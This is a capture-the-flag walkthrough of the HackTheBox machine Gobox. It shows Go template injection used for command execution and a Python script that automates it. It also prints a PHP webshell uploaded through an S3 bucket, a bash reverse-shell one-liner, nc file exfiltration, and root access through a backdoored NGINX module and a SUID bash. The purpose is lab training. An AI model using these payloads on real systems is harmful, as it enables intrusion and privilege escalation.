---
title: HTB: Gobox
url: https://0xdf.gitlab.io/2021/08/30/htb-gobox.html
date: 2021-08-30T12:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: hackthebox, htb-gobox, ctf, uhc, nmap, ubuntu, golang, ssti, feroxbuster, youtube, python, python-cmd, aws, awscli, docker, s3, webshell, upload, nginx-module, backdoor, nginxexecute
---

![Gobox](https://0xdfimages.gitlab.io/img/gobox-cover.png)

HackTheBox made Gobox to be used in the Hacking Esports UHC competition on Aug 29, 2021. Once the competition is over, HTB put it out for all of us to play. This is neat box, created by IppSec, where I’ll exploit a server-side template injection vulnerability in a Golang webserver to leak creds to the site, and then the full source. I’ll use the source with the SSTI to get execution, but no shell. I’ll write a script to make enumeration easy, and then identify the host is in AWS, and is managing a bucket the hosts another site. I’ll upload a PHP webshell to get a shell on the main host. Finally, I’ll find a backdoor NGINX module which is enabled, reverse it to get execution, and get a shell as root.

## Box Info

| Name | [Gobox](https://hackthebox.com/machines/gobox)  [Gobox](https://hackthebox.com/machines/gobox) [Play on HackTheBox](https://hackthebox.com/machines/gobox) |
| --- | --- |
| Release Date | 30 Aug 2021 |
| Retire Date | 30 Aug 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [Ippsec Ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` found four open TCP ports, SSH (22), and three HTTP servers (80, 4566, and 8080):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.113
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 12:14 EDT
Nmap scan report for 10.10.11.113
Host is up (0.16s latency).
Not shown: 65528 closed ports
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
4566/tcp open     kwtc
8080/tcp open     http-proxy
9000/tcp filtered cslistener
9001/tcp filtered tor-orport
9002/tcp filtered dynamid

Nmap done: 1 IP address (1 host up) scanned in 104.28 seconds

oxdf@parrot$ nmap -p 22,80,4566,8080 -sCV -oA scans/nmap-tcpscripts 10.10.11.113
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 12:17 EDT
Nmap scan report for 10.10.11.113
Host is up (0.094s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open  http    nginx
|_http-title: Hacking eSports | {{.Title}}
4566/tcp open  http    nginx
|_http-title: 403 Forbidden
8080/tcp open  http    nginx
|_http-title: Hacking eSports | Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.75 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 20.04 Focal. There are three filtered ports, 9001, 9002, and 9003, which is likely an indication that the firewall is blocking them.

### HTTP - TCP 80

#### Site

The site is a Hacking eSports page:

![image-20210826122736665](https://0xdfimages.gitlab.io/img/image-20210826122736665.png)

`nmap` showed the page title, which almost looked like an error. It shows up that way in Firefox as well:

![image-20210826122814961](https://0xdfimages.gitlab.io/img/image-20210826122814961.png)

Not much else going on.

#### Tech Stack

The response headers don’t give any additional information:

```

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 26 Aug 2021 16:24:25 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1803

```

Visiting `/index.php` loads the same page, so the site is based on PHP.

Checking `/index.html` shows just the text “test”:

![image-20210826123128972](https://0xdfimages.gitlab.io/img/image-20210826123128972.png)

Not much to do with that.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@parrot$ feroxbuster -u http://10.10.11.113 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.113
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       11w      162c http://10.10.11.113/css
200       54l      190w        0c http://10.10.11.113/index.php
[####################] - 1m    119996/119996  0s      found:2       errors:0      
[####################] - 1m     59998/59998   521/s   http://10.10.11.113
[####################] - 1m     59998/59998   521/s   http://10.10.11.113/css

```

It doesn’t find anything interesting at all.

### HTTP - TCP 4566

The site on TCP 4566 just returns a 403 Forbidden. The HTTP response headers are the same as on 80. `feroxbuster` didn’t find anything either, as the site seems to send 403 responses to any path.

### HTTP - TCP 8080

#### Site

The HTTP server on 8080 returns a login form:

![image-20210826123642978](https://0xdfimages.gitlab.io/img/image-20210826123642978.png)

Given this was presented in a UHC competition, it’s not even clear to me if it uses the `gobox.htb` domain, so guessing at emails is likely not the path.

Submitting generates a POST request with just the email and password:

```

POST / HTTP/1.1
Host: 10.10.11.113:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
Origin: http://10.10.11.113:8080
DNT: 1
Connection: close
Referer: http://10.10.11.113:8080/
Upgrade-Insecure-Requests: 1

email=0xdf%40gobox.htb&password=%27

```

If I try to enter a non-email address into the email form, it complains on submit:

![image-20210826123818734](https://0xdfimages.gitlab.io/img/image-20210826123818734.png)

I sent the POST request to Burp repeater to test some basic SQL injections, but didn’t find anything.

There’s a link on the page to “Forgot Password”, which loads `/forgot/`:

![image-20210826124032261](https://0xdfimages.gitlab.io/img/image-20210826124032261.png)

The same kind of filtering is done client-side to match an email. If I submit a real email, it claims to have sent an email:

![image-20210826124142158](https://0xdfimages.gitlab.io/img/image-20210826124142158.png)

#### Tech Stack

The HTTP response headers here have additional information:

```

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 26 Aug 2021 16:35:48 GMT
Content-Type: text/html; charset=utf-8
Connection: close
X-Forwarded-Server: golang
Content-Length: 1752

```

The `X-Forwarded-Server` header is not a [standard HTTP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers). It’s specifically calling out that this server is written in Go.

Anything I put after `/` (other than `/forgot/`) seems to return the same page, the login form. This behavior is unlike something I’d see from a PHP server, though NGINX could be configured to act this way. Still, given the hint about Go, this seems like a custom Go web server.

#### Directory Brute Force

`feroxbuster` is smart enough to identify the default pages and ignore those. It doesn’t find anything else except `/forgot`:

```

oxdf@parrot$ feroxbuster -u http://10.10.11.113:8080

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.113:8080
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
WLD       54l      109w     1752c Got 200 for http://10.10.11.113:8080/7b11184a6a174bbbb1a69d3e329f1dce (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 1752 responses; toggle this behavior by using --dont-filter
WLD       54l      109w     1752c Got 200 for http://10.10.11.113:8080/803b36aa00db4e3085275d65269c0061ca8050f645d44520a943a05497b2c30d514a4c03936f4a778950b0672f2cd30b (url length: 96)
301        2l        3w       43c http://10.10.11.113:8080/forgot
WLD       50l       93w     1482c Got 200 for http://10.10.11.113:8080/forgot/9d63571fbcb4421baa68ccff67ab5120 (url length: 32)
WLD         -         -         - Wildcard response is static; auto-filtering 1482 responses; toggle this behavior by using --dont-filter
WLD       50l       93w     1482c Got 200 for http://10.10.11.113:8080/forgot/48b2790c677c458fa367f43da1cbd0bba70e94ee98ef48a2a25c18468802824ae945f798abf64ab5a2bec2eb0054e53a (url length: 96)
[####################] - 1m     59998/59998   0s      found:5       errors:0      
[####################] - 59s    30001/29999   503/s   http://10.10.11.113:8080
[####################] - 59s    30001/29999   503/s   http://10.10.11.113:8080/forgot

```

## RCE as root in aws Container

### Access Page Source

#### SSTI

With the Python and Ruby templating engines one of the first things I look for is server-side template injection (SSTI). The basic idea is passing in what would be code to the templating engine and seeing if it runs it or handles it as text.

[This post](https://blog.takemyhand.xyz/2020/05/ssti-breaking-gos-template-engine-to.html) does a nice job talking about how to start looking for SSTI in Go. The payload `{{html "0xdf"}}` will resolve to “0xdf” if the site is vulnerable. From Repeater (because I can’t send these payload through Firefox because of the client-side filtering), I’ll enter that payload, and look at the response:

![image-20210826130637205](https://0xdfimages.gitlab.io/img/image-20210826130637205.png)

It worked! On line 40, it says “Email Sent To: ssti”.

`{{ . }}` will return the data structure passed into the template, which the post suggests is similar to `{{ self }}` in other templating systems. Putting that in returns the following:

![image-20210826130827990](https://0xdfimages.gitlab.io/img/image-20210826130827990.png)

That’s an email address and a likely password.

#### Login

Those creds do work to log into the site, which return what looks to be the source of the site:

![image-20210826131912187](https://0xdfimages.gitlab.io/img/image-20210826131912187.png)

### RCE

#### Identify DebugCmd

The source is interesting, but the thing that quickly jumps out to me is the `DebugCmd` function:

```

func (u User) DebugCmd (test string) string {
  ipp := strings.Split(test, " ")
  bin := strings.Join(ipp[:1], " ")
  args := strings.Join(ipp[1:], " ")
  if len(args) > 0{
    out, _ := exec.Command(bin, args).CombinedOutput()
    return string(out)
  } else {
    out, _ := exec.Command(bin).CombinedOutput()
    return string(out)
  }
}

```

It isn’t used elsewhere in the page, but it exists.

#### Execution

In the SSTI above, I used `{{ . }}` to print the current objects passed into the template. I can also reference functions from the code within `{{ }}`. [This post](https://www.calhoun.io/intro-to-templates-p3-functions/) talks about how to reference objects (including functions) from the templating engine using a `.function_name`. Submitting `{{ .DebugCmd "id" }}` returns proof of execution:

![image-20210826132627098](https://0xdfimages.gitlab.io/img/image-20210826132627098.png)

### Connection Fails

I tried a bunch of things to get a connection back to my host, but all failed. First I tried to `ping` my host with `{{ .DebugCmd "ping -c 1 10.10.14.6" }}`, but it returned `/bin/bash: ping: command not found`. I tried giving it full path in `/usr/bin` and others, but no luck. I switched to running `find` commands like `find / -name ping`. `ping`, `wget`, `nc`, `curl`, were all not on the host.

I verified that my syntax would work by searching for `bash`:

![image-20210826133041067](https://0xdfimages.gitlab.io/img/image-20210826133041067.png)

I tried to use `/dev/tcp` to contact my host with `"echo test > /dev/tcp/10.10.14.6/443"`. It just hung the page. My thinking here is that the site is now trying to contact me, but the firewall is blocking outbound. So the site keeps trying until it times out. After a full minute or two:

```

HTTP/1.1 504 Gateway Time-out
Server: nginx
Date: Thu, 26 Aug 2021 17:32:44 GMT
Content-Type: text/html
Content-Length: 160
Connection: close

<html>
<head><title>504 Gateway Time-out</title></head>
<body>
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx</center>
</body>
</html>

```

### Command Script

I’ll write a quick shell to allow me to enumerate the filesystem. [This video](https://www.youtube.com/watch?v=B_NXWx8BuHM) shows the process for that:

Here’s the final script (with a few variable renames):

```

#!/usr/bin/env python3    

import re    
import requests    
from cmd import Cmd    
from html import unescape    

class Term(Cmd):    
    prompt = "gobox> "    
    capture_re = re.compile(r"Email Sent To: (.*?)\s+<button class", re.DOTALL)    

    def default(self, args):    
        """Run given input as command on gobox"""    
        cmd = args.replace('"', '\\"')    
        resp = requests.post('http://10.10.11.113:8080/forgot/',    
                data = {"email": f'{{{{ .DebugCmd "{cmd}" }}}}'},    
                proxies = {"http": "http://127.0.0.1:8080"})    
        try:    
            result = self.capture_re.search(resp.text).group(1)    
            result = unescape(unescape(result))
            print(result)
        except:
            import pdb; pdb.set_trace()

    def do_exit(self, args):
        """Exit"""
        return True

term = Term()
term.cmdloop()

```

When I give it anything besides `exit`, it will make the request to run the command and use a regex to pull the SSTI result from the returned page.

```

oxdf@parrot$ python3 shell.py 
gobox> id
uid=0(root) gid=0(root) groups=0(root)
gobox> pwd
/opt/uhc

```

## Shell as www-data

### Enumeration

#### Filesystem

The hostname of this system is aws:

```

gobox> hostname
aws

```

When `ifconfig` and `ip` are not installed on the system, it’s a really good hint that this is a container.

```

gobox> ifconfig
/bin/bash: ifconfig: command not found
gobox> ip
/bin/bash: ip: command not found

```

I can grab the IP from `/proc/net/fib_trie`:

```

gobox> cat /proc/net/fib_trie 
...[snip]...
           |-- 172.28.0.2
...[snip]...

```

There is a `.dockerenv` file in the root:

```

gobox> ls -la /
total 60
drwxr-xr-x   1 root root 4096 Aug 24 19:06 .
drwxr-xr-x   1 root root 4096 Aug 24 19:06 ..
-rwxr-xr-x   1 root root    0 Aug 24 19:06 .dockerenv
lrwxrwxrwx   1 root root    7 Jul 23 17:35 bin -> usr/bin
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot
drwxr-xr-x   5 root root  340 Aug 26 16:14 dev
drwxr-xr-x   1 root root 4096 Aug 24 19:06 etc
drwxr-xr-x   2 root root 4096 Apr 15  2020 home
lrwxrwxrwx   1 root root    7 Jul 23 17:35 lib -> usr/lib
lrwxrwxrwx   1 root root    9 Jul 23 17:35 lib32 -> usr/lib32
lrwxrwxrwx   1 root root    9 Jul 23 17:35 lib64 -> usr/lib64
lrwxrwxrwx   1 root root   10 Jul 23 17:35 libx32 -> usr/libx32
drwxr-xr-x   2 root root 4096 Jul 23 17:35 media
drwxr-xr-x   2 root root 4096 Jul 23 17:35 mnt
drwxr-xr-x   1 root root 4096 Aug 24 19:06 opt
dr-xr-xr-x 271 root root    0 Aug 26 16:14 proc
drwx------   1 root root 4096 Aug 26 15:18 root
drwxr-xr-x   5 root root 4096 Jul 23 17:38 run
lrwxrwxrwx   1 root root    8 Jul 23 17:35 sbin -> usr/sbin
drwxr-xr-x   2 root root 4096 Jul 23 17:35 srv
dr-xr-xr-x  13 root root    0 Aug 26 16:14 sys
drwxrwxrwt   1 root root 4096 Aug 24 19:09 tmp
drwxr-xr-x   1 root root 4096 Jul 23 17:35 usr
drwxr-xr-x   1 root root 4096 Jul 23 17:38 var

```

#### AWS

The hostname is a hint that this might be or at least represent an AWS EC2 container / host. The AWS command line tool, `aws` is installed as well:

```

gobox> which aws
/usr/bin/aws

```

Looking at S3, the `ls` command shows a single bucket named `website`:

```

gobox> aws s3 ls
2021-08-26 16:14:44 website

```

That bucket seems to contain files associated with the site on port 80:

```

gobox> aws s3 ls s3://website
                           PRE css/
2021-08-26 16:14:44    1294778 bottom.png
2021-08-26 16:14:44     165551 header.png
2021-08-26 16:14:44          5 index.html
2021-08-26 16:14:44       1803 index.php

```

Even `index.html` is there. Remembering that I’m running this from the container, I can copy a file from the bucket to somewhere on that filesystem, like `/tmp`:

```

gobox> aws s3 cp s3://website/index.html /tmp/index.html
download: s3://website/index.html to ../../tmp/index.htmlmaining
gobox> cat /tmp/index.html
test

```

The contents are the same.

#### AWS Credentials

If I wanted to interact with the AWS stack from my host, that’s what TCP 4566 is. I can grab the credentials file from `~/.aws`:

```

gobox> ls -la ~/.aws
total 12
drwxr-xr-x 2 root root 4096 Aug 24 19:06 .
drwx------ 1 root root 4096 Aug 26 15:18 ..
-rw-r--r-- 1 root root  260 Aug 24 16:21 credentials
gobox> cat ~/.aws/credentials
[default]
aws_access_key_id=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
aws_secret_access_key=SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz

```

If I put that in my local `~/.aws/credentials`, now I can hit this LocalStack from my VM:

```

oxdf@parrot$ aws --endpoint-url http://10.10.11.113:4566 s3 ls
2021-08-26 12:14:44 website

```

### Webshell

With this access to the bucket containing the files from the site running with PHP, I’ll try to write a simple PHP webshell:

```

gobox> echo '<?php echo shell_exec($_REQUEST["cmd"]); ?>'
<?php echo shell_exec($_REQUEST["cmd"]); ?>
gobox> echo '<?php echo shell_exec($_REQUEST["cmd"]); ?>' > /tmp/.0xdf

```

Now I’ll upload that file to the bucket:

```

gobox> aws s3 cp /tmp/.0xdf s3://website/0xdf.php
upload: ../../tmp/.0xdf to s3://website/0xdf.phpile(s) remaining

```

It’s not weird that a website might be [hosted out of an S3 bucket](https://docs.aws.amazon.com/AmazonS3/latest/userguide/HostingWebsiteOnS3Setup.html). It’s a bit odd that that site would be running PHP, but not impossible.

Either the site is hosted from the bucket or there’s some process keeping the bucket and the site in sync, so the webshell shows up instantly on the main site:

![image-20210826141101951](https://0xdfimages.gitlab.io/img/image-20210826141101951.png)

### Shell

This time the host can connect back. I’ll visit:

```

http://10.10.11.113/0xdf.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.6/443 0>%261'

```

And at a listening `nc`, there’s a shell:

```

oxdf@parrot$ nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.113] 48048
bash: cannot set terminal process group (819): Inappropriate ioctl for device
bash: no job control in this shell
www-data@gobox:/opt/website$ 

```

I’ll upgrade the shell with the `script` trick:

```

www-data@gobox:/opt/website$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@gobox:/opt/website$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@gobox:/opt/website$ 

```

And grab `user.txt`:

```

www-data@gobox:/home/ubuntu$ cat user.txt
d6b91626************************

```

## Shell as root

### Enumeration

#### Filesystem

There’s nothing else in the ubuntu user’s home directory, so I’ll turn the the web servers. Interestingly, there’s nothing in `/var/www/html`:

```

www-data@gobox:~/html$ ls -la
total 12
drwxr-xr-x 2 root root 4096 Aug 23 14:43 .
drwxr-xr-x 3 root root 4096 Aug 23 14:43 ..
-rw-r--r-- 1 root root  612 Aug 23 14:43 index.nginx-debian.html

```

And that’s the only folder in `/var/www`:

```

www-data@gobox:~$ ls 
html

```

`/etc/nginx/sites-enabled` has the config for the various hosts:

```

www-data@gobox:/etc/nginx/sites-enabled$ ls
default

```

The config defines four servers.

#### LocalStack Server

The first is 4566:

```

server {            
        listen 4566 default_server;              

        root /var/www/html;
                               
        index index.html index.htm index.nginx-debian.html;
                               
        server_name _;     

        location / {                                          
                if ($http_authorization !~ "(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZ
UJveCAtIEhhY2tpbmdFc3BvcnRz(.*)") {
                    return 403; 
                }
                proxy_pass http://127.0.0.1:9000;
        }

}

```

It’s doing a hardcoded auth check. If that fails, it will return 403, which matches the enumeration above. If that succeeds, it forwards to port 9000.

In the process list, there’s a `docker-proxy` running, listening on 9000, forwarding to 4566 in a container at 172.28.0.3:

```

www-data@gobox:/etc/nginx/sites-enabled$ ps auxww
...[snip]...
root        1104  0.0  0.0 1222832 3764 ?        Sl   16:14   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 9000 -container-ip 172.28.0.3 -container-port 4566
...[snip]...

```

That’s a different container than the Go webserver, and would likely be the LocalStack container. These hardcoded creds are a bit of a kludge, but LocalStack doesn’t have the capability to authenticate, as it’s just a test platform. This is a neat way to give localstack a more real-world feel with creds.

#### Main Server

The next server is listening on 80:

```

server {
        listen 80;
        root /opt/website;
        index index.php;

        location ~ [^/]\.php(/|$) {
            fastcgi_index index.php;
            fastcgi_param REQUEST_METHOD $request_method;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param QUERY_STRING $query_string;

            fastcgi_pass unix:/tmp/php-fpm.sock;
        }
}

```

It is based out of `/opt/website` and it’s forwarding PHP on to a socket to handle that. Nothing too exciting here.

#### Golang Server

The third server is listening on 8080:

```

server {
        listen 8080;
        add_header X-Forwarded-Server golang;
        location / {
                proxy_pass http://127.0.0.1:9001;
        }
}

```

This is where the custom header is added, and otherwise it’s just proxied on to localhost 9001.

`docker-proxy` is also handing that forward to the Golang container:

```

www-data@gobox:/etc/nginx/sites-enabled$ ps auxww
...[snip]...
root        1084  0.1  0.1 1741004 5084 ?        Sl   16:14   0:14 /usr/bin/docker-proxy -proto tcp -host-ip 0.0.0.0 -host-port 9001 -container-ip 172.28.0.2 -container-port 80
...[snip]...

```

#### Unknown Server

There’s an unknown server listening only on localhost, TCP 8000:

```

server {
        listen 127.0.0.1:8000;
        location / {
                command on;
        }
}

```

It doesn’t have a home directory, and it’s only directive is `command on`, which doesn’t mean anything to me.

I tried googling for it, but came up empty. It’s definitely not a standard NGINX thing. So I looked in the modules:

```

www-data@gobox:/etc/nginx/modules-enabled$ ls
50-backdoor.conf               50-mod-http-xslt-filter.conf  50-mod-stream.conf
50-mod-http-image-filter.conf  50-mod-mail.conf

```

`50-backdoor.conf` is pretty suspicious!

```

www-data@gobox:/etc/nginx/modules-enabled$ cat 50-backdoor.conf 
load_module modules/ngx_http_execute_module.so;

```

Googling for “ngx\_http\_execute\_module.so”, the first result is [this GitHub](https://github.com/limithit/NginxExecute):

![image-20210826151346829](https://0xdfimages.gitlab.io/img/image-20210826151346829.png)

That definitely looks like what what’s on Gobox.

### Backdoor Fail

According to the docs, I should be able to trigger this backdoor by making a request to the server with this enabled with the parameter `?system.run[command]`.

Since the server is only listening on localhost, I’ll just use `curl` from my shell. It doesn’t work:

```

www-data@gobox:~$ curl http://127.0.0.1:8000?system.run[id]
curl: (52) Empty reply from server

```

### Identify Argument

#### Exfil Copy

To take a look at the backdoor, I needed to find a copy. I knew from the config that it’s named `ngx_http_execute_module.so`, so I just used `find`:

```

www-data@gobox:~$ find / -name ngx_http_execute_module.so 2>/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
www-data@gobox:~$ ls -l /usr/lib/nginx/modules/ngx_http_execute_module.so 
-rw-r--r-- 1 root root 163896 Aug 23 20:59 /usr/lib/nginx/modules/ngx_http_execute_module.so

```

I’m able to read it as well. I’ll send it back to a listening `nc` on my host with:

```

www-data@gobox:~$ cat /usr/lib/nginx/modules/ngx_http_execute_module.so | nc 10.10.14.6 443

```

At my host:

```

oxdf@parrot$ nc -lnvp 443 > ngx_http_execute_module.so
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.113] 48084
^C

```

And the hashes match:

```

www-data@gobox:~$ md5sum /usr/lib/nginx/modules/ngx_http_execute_module.so
15f0ad443a4b4888bfbee4e5b2cf0ae6  /usr/lib/nginx/modules/ngx_http_execute_module.so

```

```

oxdf@parrot$ md5sum ngx_http_execute_module.so 
15f0ad443a4b4888bfbee4e5b2cf0ae6  ngx_http_execute_module.so

```

#### Strings

Just running strings on the binary is enough to figure out the new command word:

```

oxdf@parrot$ strings ngx_http_execute_module.so
...[snip]...
ippsec.run
...[snip]...

```

That looks too similar to `system.run` to not be it.

### Execute via Backdoor

Trying again with the new argument name works:

```

www-data@gobox:~$ curl http://127.0.0.1:8000?ippsec.run[id]
uid=0(root) gid=0(root) groups=0(root)

```

Typically to save myself having to url-encode, I would switch to a GET (`-G`) with `--data-urlencode`, but the issue here is that I don’t want to encode the `[]`.

Still, I can do it myself:

```

www-data@gobox:~$ curl 'http://127.0.0.1:8000?ippsec.run[ls%20%2froot]'
iptables.sh
snap

```

To get shell, I’ll copy Bash into `tmp`:

```

www-data@gobox:~$ curl 'http://127.0.0.1:8000?ippsec.run[cp%20%2fbin%2fbash%20%2ftmp]'
curl: (52) Empty reply from server
www-data@gobox:~$ ls -l /tmp/bash
-rwxr-xr-x 1 root root 1183448 Aug 26 19:38 /tmp/bash

```

Now `chmod` to set it as SUID:

```

www-data@gobox:~$ curl 'http://127.0.0.1:8000?ippsec.run[chmod%204777%20%2ftmp%2fbash]'      
curl: (52) Empty reply from server
www-data@gobox:~$ ls -l /tmp/bash
-rwsrwxrwx 1 root root 1183448 Aug 26 19:38 /tmp/bash

```

Notice the `s` as the forth letter there. Running it with `-p` will preserve privilege:

```

www-data@gobox:~$ /tmp/bash -p
bash-5.0#

```

And I can get the last flag:

```

bash-5.0# cat /root/root.txt
81d35170************************

```